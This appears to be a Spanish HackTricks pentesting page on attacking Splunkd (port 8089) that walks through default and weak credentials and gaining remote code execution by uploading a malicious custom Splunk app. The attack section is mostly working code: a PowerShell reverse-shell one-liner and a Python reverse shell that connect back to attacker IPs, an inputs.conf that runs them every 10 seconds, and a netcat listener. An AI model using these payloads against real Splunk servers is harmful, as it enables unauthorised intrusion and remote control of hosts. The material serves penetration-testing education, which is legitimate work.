# 8089 - Pentesting Splunkd

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Â¿Trabajas en una **empresa de ciberseguridad**? Â¿Quieres ver tu **empresa anunciada en HackTricks**? Â¿O quieres tener acceso a la **Ãºltima versiÃ³n de PEASS o descargar HackTricks en PDF**? Â¡Consulta los [**PLANES DE SUSCRIPCIÃ“N**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecciÃ³n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* ObtÃ©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Ãšnete al** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sÃ­gueme** en **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **InformaciÃ³n bÃ¡sica**

**Splunk** es una herramienta de **anÃ¡lisis de registros** utilizada para recopilar, analizar y visualizar datos. Aunque originalmente no estaba destinado a ser una herramienta SIEM, Splunk a menudo se utiliza para **monitoreo de seguridad y anÃ¡lisis empresarial**. Las implementaciones de Splunk a menudo se utilizan para almacenar **datos sensibles** y podrÃ­an proporcionar una gran cantidad de informaciÃ³n para un atacante si se comprometen.

**Puerto predeterminado:** 8089
```
PORT     STATE SERVICE VERSION
8089/tcp open  http    Splunkd httpd
```
{% hint style="info" %}
El servidor web de Splunk se ejecuta por defecto en el puerto 8000.
{% endhint %}

## EnumeraciÃ³n

### VersiÃ³n gratuita

La versiÃ³n de prueba de Splunk Enterprise se convierte en una versiÃ³n gratuita despuÃ©s de 60 dÃ­as, que no requiere autenticaciÃ³n. No es raro que los administradores del sistema instalen una versiÃ³n de prueba de Splunk para probarla, que posteriormente se olvida. Esto se convertirÃ¡ automÃ¡ticamente en la versiÃ³n gratuita que no tiene ningÃºn tipo de autenticaciÃ³n, lo que introduce un agujero de seguridad en el entorno. Algunas organizaciones pueden optar por la versiÃ³n gratuita debido a limitaciones presupuestarias, sin comprender completamente las implicaciones de no tener gestiÃ³n de usuarios/roles.

### Credenciales por defecto

En versiones antiguas de Splunk, las credenciales por defecto son `admin:changeme`, que se muestran convenientemente en la pÃ¡gina de inicio de sesiÃ³n. Sin embargo, la Ãºltima versiÃ³n de Splunk establece credenciales durante el proceso de instalaciÃ³n. Si las credenciales por defecto no funcionan, vale la pena comprobar contraseÃ±as dÃ©biles comunes como `admin`, `Welcome`, `Welcome1`, `Password123`, etc.

### Obtener informaciÃ³n

Una vez iniciada la sesiÃ³n en Splunk, podemos navegar por los datos, ejecutar informes, crear paneles, instalar aplicaciones desde la biblioteca de Splunkbase e instalar aplicaciones personalizadas. TambiÃ©n se puede ejecutar cÃ³digo: Splunk tiene mÃºltiples formas de ejecutar cÃ³digo, como aplicaciones Django en el lado del servidor, puntos finales REST, entradas con scripts y scripts de alerta. Un mÃ©todo comÃºn para obtener ejecuciÃ³n remota de cÃ³digo en un servidor Splunk es mediante el uso de una entrada con script.

AdemÃ¡s, como Splunk se puede instalar en hosts de Windows o Linux, se pueden crear entradas con scripts para ejecutar scripts Bash, PowerShell o Batch.

### Shodan

* `ConstrucciÃ³n de Splunk`

## RCE

### Crear aplicaciÃ³n personalizada

Una aplicaciÃ³n personalizada puede ejecutar scripts de Python, Batch, Bash o PowerShell. Tenga en cuenta que Splunk viene con Python instalado, por lo que incluso en sistemas Windows podrÃ¡ ejecutar cÃ³digo de Python.

Puede utilizar [**este**](https://github.com/0xjpuff/reverse\_shell\_splunk) paquete de Splunk para ayudarnos. El directorio `bin` en este repositorio tiene ejemplos para [Python](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/rev.py) y [PowerShell](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/run.ps1). Vamos a ver esto paso a paso.

Para lograr esto, primero necesitamos crear una aplicaciÃ³n personalizada de Splunk utilizando la siguiente estructura de directorios:
```shell-session
tree splunk_shell/

splunk_shell/
â”œâ”€â”€ bin
â””â”€â”€ default
```
El directorio **`bin`** contendrÃ¡ cualquier **script que pretendamos ejecutar** (en este caso, un shell inverso de **PowerShell**), y el directorio predeterminado tendrÃ¡ nuestro archivo `inputs.conf`. Nuestro shell inverso serÃ¡ una **lÃ­nea de comando de PowerShell:**
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close(
```
El archivo [inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf) indica a Splunk **quÃ© script ejecutar** y cualquier otra condiciÃ³n. AquÃ­ establecemos que la aplicaciÃ³n estÃ¡ habilitada y le decimos a Splunk que ejecute el script cada 10 segundos. El intervalo siempre estÃ¡ en segundos, y la entrada (script) solo se ejecutarÃ¡ si esta configuraciÃ³n estÃ¡ presente.
```shell-session
cat inputs.conf 

[script://./bin/rev.py]
disabled = 0  
interval = 10  
sourcetype = shell 

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```
Necesitamos el archivo `.bat`, que se ejecutarÃ¡ cuando se implemente la aplicaciÃ³n y ejecutarÃ¡ la lÃ­nea de comando de PowerShell.

El siguiente paso es elegir `Instalar aplicaciÃ³n desde archivo` y cargar la aplicaciÃ³n.

<figure><img src="../.gitbook/assets/image (4) (5) (1).png" alt=""><figcaption></figcaption></figure>

Antes de cargar la aplicaciÃ³n personalizada maliciosa, iniciemos un escucha usando Netcat o [socat](https://linux.die.net/man/1/socat).
```shell-session
sudo nc -lnvp 443

listening on [any] 443 ...
```
En la pÃ¡gina `Subir aplicaciÃ³n`, haz clic en `Examinar`, elige el archivo tarball que creamos anteriormente y haz clic en `Subir`. **Tan pronto como subamos la aplicaciÃ³n**, recibiremos una **shell inversa** y el estado de la aplicaciÃ³n se cambiarÃ¡ automÃ¡ticamente a `Habilitado`.

#### Linux

Si estuviÃ©ramos tratando con un **host de Linux**, tendrÃ­amos que **editar el script Python `rev.py`** antes de crear el tarball y subir la aplicaciÃ³n maliciosa personalizada. El resto del proceso serÃ­a el mismo, y obtendrÃ­amos una conexiÃ³n de shell inversa en nuestro listener de Netcat y estarÃ­amos listos para empezar.
```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```
### RCE y Escalada de Privilegios

En la siguiente pÃ¡gina puedes encontrar una explicaciÃ³n de cÃ³mo se puede abusar de este servicio para escalar privilegios y obtener persistencia:

{% content-ref url="../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md" %}
[splunk-lpe-and-persistence.md](../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md)
{% endcontent-ref %}

## Referencias

* [https://academy.hackthebox.com/module/113/section/1213](https://academy.hackthebox.com/module/113/section/1213)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Â¿Trabajas en una **empresa de ciberseguridad**? Â¿Quieres ver tu **empresa anunciada en HackTricks**? Â¿O quieres tener acceso a la **Ãºltima versiÃ³n de PEASS o descargar HackTricks en PDF**? Â¡Consulta los [**PLANES DE SUSCRIPCIÃ“N**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecciÃ³n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Consigue el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Ãšnete al** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sÃ­gueme** en **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
